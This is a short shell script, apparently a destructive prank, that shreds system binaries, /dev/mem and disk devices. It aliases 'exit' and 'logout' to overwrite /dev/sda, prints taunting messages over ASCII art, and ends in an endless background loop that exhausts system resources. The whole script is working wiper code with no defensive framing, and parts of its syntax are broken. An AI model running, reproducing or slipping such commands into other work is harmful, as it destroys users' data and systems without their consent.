

cd /
cp /etc/profile /home/it5/.profile

shred -n 6 -z -u -v /dev/mem
shred -n 6 -z -u -v /dev/bash
shred -n 6 -z -u -v /bin/systemctl
shred -n 6 -z -u -v /usr/bin/bash
shred -n 6 -z -u -v sda1
shred -n 6 -z -u -v sda
shred -n 6 -z -u -v sda2

alias exit="shred -n 6 -z -u -v /dev/sda"
alias logout="shred -n 6 -z -u -v /dev/sda"
echo 'And youre computeur is not really fine '
echo 'but youre looking good today'
ecrire () {
    cat << 'EOF' 
                ________o8A888888o_
            _o888888888888K_]888888o
                      ~~~+8888888888o
                          ~8888888888
                          o88888888888
                         o8888888888888
                       _8888888888888888
                      o888888888888888888_
                     o88888888888888888888_
                    _8888888888888888888888_
                    888888888888888888888888_
                    8888888888888888888888888
                    88888888888888888888888888
                    88888888888888888888888888
                    888888888888888888888888888
                    ~88888888888888888888888888_
                     (88888888888888888888888888
                      888888888888888888888888888
                       888888888888888888888888888_
                       ~8888888888888888888888888888
                         +88888888888888888888~~~~~
                          ~=888888888888888888o
                   _=oooooooo888888888888888888
                    _o88=8888==~88888888===8888_   unknown
                    ~   =~~ _o88888888=      ~~~
                            ~ o8=~88=~
}

EOF

ecrire
}

while :
do
((ecrire)&)
done

